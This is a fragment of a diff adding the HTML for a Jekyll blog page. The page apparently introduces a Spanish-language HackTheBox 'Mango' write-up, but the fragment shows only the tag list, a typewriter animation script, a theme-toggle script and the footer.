href="/tag/python%2C/" class="set-1">python,</a> <a href="/tag/redis-cli%2C/" class="set-1">redis-cli,</a> <a href="/tag/rsync%2C/" class="set-1">rsync,</a> <a href="/tag/smtpd%2C/" class="set-1">smtpd,</a> <a href="/tag/socat%2C/" class="set-1">socat,</a> <a href="/tag/squidproxy%2C/" class="set-1">squidproxy,</a> <a href="/tag/steghide%2C/" class="set-1">steghide,</a> <a href="/tag/tar%2C/" class="set-1">tar,</a> <a href="/tag/webdav%2C/" class="set-1">webdav,</a> <a href="/tag/welcome/" class="set-1">welcome</a> <a href="/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada MANGO';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
